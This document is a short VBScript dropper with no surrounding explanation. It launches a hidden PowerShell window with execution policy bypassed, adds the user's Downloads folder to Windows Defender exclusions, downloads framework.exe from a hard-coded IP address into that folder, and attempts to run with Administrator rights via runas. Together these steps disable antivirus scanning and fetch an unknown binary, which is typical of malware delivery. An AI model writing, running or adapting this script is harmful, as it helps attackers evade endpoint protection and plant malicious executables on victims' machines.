Set shell = CreateObject("WScript.Shell")

' PowerShell command: Exclude Downloads + Download file
psCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
            """Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads'; " & _
            "Invoke-WebRequest -Uri 'http://192.168.0.111/framework.exe' -OutFile '$env:USERPROFILE\Downloads\framework.exe'"""

' Run as Administrator
shell.Run "runas /user:Administrator " & Chr(34) & psCommand & Chr(34), 1, False
